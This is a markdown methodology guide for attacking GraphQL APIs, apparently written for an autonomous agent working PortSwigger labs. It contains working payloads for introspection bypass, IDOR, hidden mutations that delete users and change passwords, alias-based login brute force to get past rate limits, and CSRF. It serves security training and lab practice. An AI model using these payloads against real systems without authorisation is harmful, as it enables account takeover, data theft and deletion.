# GraphQL API Security Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> GraphQL exposes a typed schema. Introspection, aliasing, and hidden mutations
> turn a single endpoint into a broad attack surface.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Locate the Endpoint
- Common paths: `/graphql`, `/api`, `/graphql/api`, `/graphql/v1`, `/index.php?graphql`
- POST a probe:
```json
{"query":"{__typename}"}
```

### 1.2 Introspection
```graphql
{ __schema { types { name fields { name } } queryType { name } mutationType { name } } }
```
- If introspection is disabled, try:
  - GET-based introspection, or a trailing newline/whitespace bypass:
    `{"query":"query{__schema\n{queryType{name}}}"}`
  - Field suggestions in errors ("Did you mean ...?") to map the schema.

---

## Phase 2: Exploitation Techniques

### 2.1 Access Control / IDOR via Hidden Fields
- Query objects by id you shouldn't see; look for `user(id:2){...}` returning
  another user's data or a `password`/`email` field.

### 2.2 Hidden / Unprotected Mutations
```graphql
mutation { deleteOrganizationUser(input:{id:3}) { user { username } } }
mutation { changePassword(input:{userId:1,newPassword:"pwned"}) { success } }
```

### 2.3 Brute-Force via Aliases (Rate-Limit Bypass)
```graphql
mutation {
  a: login(input:{user:"carlos",pw:"123"}){token}
  b: login(input:{user:"carlos",pw:"password"}){token}
  c: login(input:{user:"carlos",pw:"qwerty"}){token}
}
```
- Batches many attempts in one request, sidestepping per-request rate limits.

### 2.4 CSRF over GraphQL
- If the endpoint accepts `application/x-www-form-urlencoded` (not just JSON)
  and relies on cookies, a classic CSRF form can drive a mutation.

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **Accessing private GraphQL posts**: query the blog post by incrementing id.
- **Accidental exposure of private GraphQL fields**: introspect to find hidden
  `password` field on the user query.
- **Finding a hidden GraphQL endpoint**: probe `/api`, use `__typename`.
- **Bypassing GraphQL brute-force protections**: alias many `login` attempts.
- **Performing CSRF over GraphQL**: send the mutation as form-encoded.

---

## Phase 4: Tools & Automation
```bash
# InQL / graphql-cop / clairvoyance for schema recovery
clairvoyance -o schema.json http://target/graphql   # when introspection is off
```
- Burp extension **InQL Scanner**; **GraphQL Raider** for editing queries.

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| Introspection disabled | Suggestions-based recovery / clairvoyance |
| Endpoint 404 | Enumerate alt paths; try GET + `query=` param |
| Rate limited | Alias batching in a single request |
| Only JSON accepted | CSRF may be blocked; find another vector |

## Success Criteria
- [ ] Read unauthorized data or invoked a privileged mutation
- [ ] Retrieved credentials / deleted target user / logged in
- [ ] Lab shows "solved"
